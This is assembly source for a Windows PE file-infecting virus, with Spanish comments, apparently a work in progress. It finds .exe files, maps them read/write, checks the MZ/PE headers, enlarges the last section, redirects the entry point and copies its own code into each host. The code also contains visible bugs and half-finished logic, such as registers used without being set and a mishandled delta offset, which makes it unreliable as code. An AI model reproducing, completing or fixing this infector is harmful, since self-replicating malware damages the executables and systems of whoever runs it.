; vira2.asm - código ensamblador limpio y funcional
.586
.model flat, stdcall
option casemap:none

include \masm32\include\windows.inc
include \masm32\include\kernel32.inc
include \masm32\include\user32.inc
includelib \masm32\lib\kernel32.lib
includelib \masm32\lib\user32.lib

.data
    hFindFile dd ?
    szMessageBoxA           db "MessageBoxA",0
    szCreateFileA           db "CreateFileA",0
    szFindFirstFileA        db "FindFirstFileA",0
    szFindNextFileA         db "FindNextFileA",0
    szCreateFileMappingA    db "CreateFileMappingA",0
    szMapViewOfFile         db "MapViewOfFile",0
    szUnmapViewOfFile       db "UnmapViewOfFile",0
    szCloseHandle           db "CloseHandle",0
    szKernel32              db "kernel32.dll",0
    szUser32                db "user32.dll",0
    msgCaption      db "Título del mensaje",0
    msgText         db "¡Hola desde ASM!",0
    msgError         db "¡Error!",0
    SEH_Handler db ? 

    Find_Win32_Data WIN32_FIND_DATA <>
    WFD_szFileName db  265 dup(?) 
    WFD_nFileSizeLow db  265 dup(?)
    virus_size equ endvirus-main
;.data?
    hKernel32               dd ?
    hUser32                 dd ?
    API_GetProcAddress      dd ?
    API_MessageBoxA         dd ?
    API_CreateFileA         dd ?
    API_FindFirstFileA      dd ?
    API_FindNextFileA       dd ?
    API_CreateFileMappingA  dd ?
    API_MapViewOfFile       dd ?
    API_UnmapViewOfFile     dd ?
    API_CloseHandle         dd ?
    exefiles db "*.exe"
.code

main:
  Get_Delta:
 call Delta

Continuar:
    call GetAPI

    
    mov eax, hUser32
    invoke GetProcAddress, eax, offset szMessageBoxA
    mov [API_MessageBoxA], eax
    
invoke MessageBoxA, 0, offset msgText , offset msgCaption, MB_OK




    ; Resolver CreateFileA
    mov eax, hKernel32
    invoke GetProcAddress, eax, offset szCreateFileA
    mov [API_CreateFileA], eax
    
   ; push offset szCreateFileA
    ;push hKernel32
    ;call [API_GetProcAddress]
    ;mov [API_CreateFileA], eax

    ; Resolver FindFirstFileA
    mov eax, hKernel32
    invoke GetProcAddress, eax, offset szFindFirstFileA
    mov [API_FindFirstFileA], eax
    
    ;push offset szFindFirstFileA
    ;push hKernel32
    ;call [API_GetProcAddress]
    ;mov [API_FindFirstFileA], eax

    ; Resolver FindNextFileA
    mov eax, hKernel32
    invoke GetProcAddress, eax, offset szFindNextFileA
    mov [API_FindNextFileA], eax
    
    ;push offset szFindNextFileA
    ;push hKernel32
    ;call [API_GetProcAddress]
    ;mov [API_FindNextFileA], eax

    ; Resolver CreateFileMappingA
    mov eax, hKernel32
    invoke GetProcAddress, eax, offset szCreateFileMappingA
    mov [API_CreateFileMappingA], eax
    
    ;push offset szCreateFileMappingA
    ;push hKernel32
    ;call [API_GetProcAddress]
    ;mov [API_CreateFileMappingA], eax

    ; Resolver MapViewOfFile
    mov eax, hKernel32
    invoke GetProcAddress, eax, offset szMapViewOfFile
    mov [API_MapViewOfFile], eax
    
    ;push offset szMapViewOfFile
    ;push hKernel32
    ;call [API_GetProcAddress]
    ;mov [API_MapViewOfFile], eax

    ; Resolver UnmapViewOfFile
    mov eax, hKernel32
    invoke GetProcAddress, eax, offset szUnmapViewOfFile
    mov [API_UnmapViewOfFile], eax
    
    ;push offset szUnmapViewOfFile
    ;push hKernel32
    ;call [API_GetProcAddress]
    ;mov [API_UnmapViewOfFile], eax

    ; Resolver CloseHandle
    mov eax, hKernel32
    invoke GetProcAddress, eax, offset szCloseHandle
    mov [API_CloseHandle], eax
    
    ;push offset szCloseHandle
    ;push hKernel32
    ;call [API_GetProcAddress]
    ;mov [API_CloseHandle], eax



    ; FindFirstFileA
    lea eax, [Find_Win32_Data]
    push eax
    push offset exefiles
    call [API_FindFirstFileA]
    mov [hFindFile], eax ; guardar handle

    ; Mostrar el nombre del archivo encontrado
    lea eax, [Find_Win32_Data.cFileName]
    push 0
    push offset msgCaption
    push eax
    push 0
    call [API_MessageBoxA]
    compare_find:
    cmp hFindFile,0
    je No_Hay_Problema
     
     ;abrir archivo  
     push 0
     push 0
     push 3
     push 0
     push 1
     push 0C0000000h ; Read/Write access
     ;lea eax, [Find_Win32_Data+WFD_szFileName+ebp]
   lea eax, [Find_Win32_Data.cFileName]
     ;add eax, ebp                    ; Luego sumar ebp
     push eax
     call dword ptr [API_CreateFileA] ;+ebp Delta offset en ebp
     
     
     ; Verificar si el handle es válido
    cmp eax, -1               ; INVALID_HANDLE_VALUE = 0xFFFFFFFF
    je No_Hay_Problema 
     mov ebx, eax              ; Guardar el handle en ebx por ejemplo
     
     push 0
     push offset msgCaption
     push offset msgText
     push 0
     call [API_MessageBoxA]
     ;mov ebx,eax
     ;inc eax
     ;jnz No_Hay_Problema
     mov edi, Find_Win32_Data.nFileSizeLow
     add edi, virus_size ; Host size + virus size
     
      push 0                  ; lpName = NULL
      push edi                ; dwMaximumSizeLow
      push 0                  ; dwMaximumSizeHigh (asumimos que es pequeño)
      push PAGE_READWRITE     ; flProtect
      push 0                  ; lpSecurityAttributes = NULL
      push ebx                ; hFile (ya guardado antes)
      call [API_CreateFileMappingA] 
      
      cmp eax, 0
      je No_Hay_Problema 
      mov esi, eax ; Guardar el handle del mapeo
     ;malo
     ;mov edi,dword ptr [Find_Win32_Data+WFD_nFileSizeLow+ebp]
     ;lea eax, [Find_Win32_Data]      ; Cargar la dirección base de la estructura Find_Win32_Data
     ;add eax, offset WFD_nFileSizeLow ; Sumar el desplazamiento de WFD_nFileSizeLow
     ;add eax, ebp                    ; Sumar ebp al resultado
     ;mov edi, dword ptr [eax]        ; Cargar el valor en edi
     ;add edi,virus_size ; Host plus our size
     ;push 0
     ;push edi
     ;push 0
     ;push PAGE_READWRITE ; R/W
     ;push 0 ; Opt_sec_attr
     ;push ebx ; Handle
     ;call dword ptr [API_CreateFileMappingA] 
     
     
    ; push edi
    ; push 0
    ; push 0
    ; push FILE_MAP_ALL_ACCESS
    ; push eax ; handle
    ; call dword ptr [API_MapViewOfFile] 
push 0                ; dwNumberOfBytesToMap = 0 (mapear hasta el final del archivo)
push 0                ; dwFileOffsetLow = 0 (inicio del archivo)
push 0                ; dwFileOffsetHigh = 0 (inicio del archivo)
push FILE_MAP_ALL_ACCESS ; Acceso de lectura/escritura
push esi        ; Handle devuelto por CreateFileMapping
call [API_MapViewOfFile]
     
cmp eax,0
jz cerramos     

mov esi, eax                    ; Dirección base del archivo mapeado
cmp word ptr [esi], 'MZ'        ; Verificar firma DOS
jne cerramos
     push 0
     push offset msgCaption
     push offset msgText
     push 0
     call [API_MessageBoxA]  
     

mov edx, dword ptr[esi+3Ch]              ; Offset a la cabecera PE
add edx, esi                    ; edx apunta a la cabecera PE
cmp dword ptr [edx], 00004550h ; Verificar firma 'PE\0\0'
jnz cerramos

     or word ptr ds:[0014h+edx],0 ; &iquest;Existe la optional header?
     jz cerramos ; Si el valor es cero, adios
     mov ax,word ptr ds:[016h+edx] ; &iquest;El fichero es ejecutable?
     and ax,0002h
     jz unmap_close 
     
     mov esi,edx ; EDX en PE/0/0, obtenemos offset de la tabla de secciones
     add esi,18h
     mov bx,word ptr ds:[edx+14h]
     add esi,ebx
     movzx ecx,word ptr ds:[edx+06h] ; numero de secciones
     ; La cuestión es seguir recorriendo la tabla, comparando lo siguiente:
     cmp dword ptr [edi+14h],eax
     jz Not_Biggest
 

     
     mov eax,virus_size
     xadd dword ptr ds:[esi+8h],eax ; la VirtualSize
     push eax ; VirtualSize antigua
     add eax,virus_size ; Eax vale la nueva VirtualSize
     mov ecx, dword ptr ds:[edx+03ch]
     xor edx,edx
     div ecx ; dividimos para ver el numero de bloques
     xor edx,edx
     inc eax
     mul ecx ; multiplicamos por el tamaño de bloque
     mov ecx,eax
     mov dword ptr ds:[esi+10h],ecx ; SizeOfRawData
 
     pop ebx ; VirtualSize - virus_size (lo habiamos empujado en
    ;"VirtualSize antigua")
     add ebx,dword ptr ds:[esi+0ch] ; + la RVA de la sección
     mov eax,dword ptr ds:[edx+028h] ; Guardamos el viejo entry point
     mov dword ptr ds:[edx+028h],ebx ; Ponemos el nuevo
 
     add edi,dword ptr ds:[esi+14h] ;14h = PointerToRawData, inicio de la seccion
     add edi,dword ptr ds:[esi+8h] ;8h = VirtualSize, añadimos el tamaño de la seccion
     sub edi,virus_size ;Le restamos el tamaño del virus
     lea esi,[ebp+ main] ;ESI en el principio de nuestro virus
     mov ecx,virus_size ;ECX = Tamaño del virus
     rep movsb ;Copiamos todo el virus 
     unmap_close:
     push eax
     call dword ptr [API_UnmapViewOfFile+ebp]
     cerramos:
     
     push 0
     push offset msgCaption
     push offset msgError
     push 0
     call [API_MessageBoxA]
     
     ; Cerrar handle del mapping (handle en ecx)
     push ecx
     call dword ptr [ API_CloseHandle+ebp]
     ; Cerrar handle del archivo (handle en ebx)
     push ebx
     call dword ptr [ API_CloseHandle+ebp]


     ; FindNextFileA
     lea eax, [Find_Win32_Data]
     push eax
     mov eax, [hFindFile]
     push eax
     call [API_FindNextFileA]

    ; Mostrar el nombre del archivo encontrado
    lea eax, [Find_Win32_Data.cFileName]
    push 0
    push offset msgCaption
    push eax
    push 0
    call [API_MessageBoxA]
    jmp compare_find
    No_Hay_Problema:
    push 0
    push offset msgCaption
    push offset msgError
    push 0
    call [API_MessageBoxA]
    ret 
    Not_Biggest:
    call unmap_close
    fallo:
    jmp $  ; Loop infinito para depurar
    Delta:


    mov esi,esp
    lodsd
    add dword ptr ss:[esi], (Continuar - Get_Delta)
    sub eax,offset  main
    ret

    ; -------------------------------------------------
    ; Subrutina para cargar GetProcAddress y los módulos
    ; -------------------------------------------------
    GetAPI proc
    ; Obtener handle de kernel32.dll
    push offset szKernel32
    call GetModuleHandleA
    mov [hKernel32], eax

    ; Obtener handle de user32.dll
    push offset szUser32
    call GetModuleHandleA
    mov [hUser32], eax

    ; Obtener dirección de GetProcAddress
    push offset szMessageBoxA     ; solo para forzar push-push-call estilo
    push [hKernel32]
    call GetProcAddress
    mov [API_GetProcAddress], eax

    ret
GetAPI endp

endvirus:

end main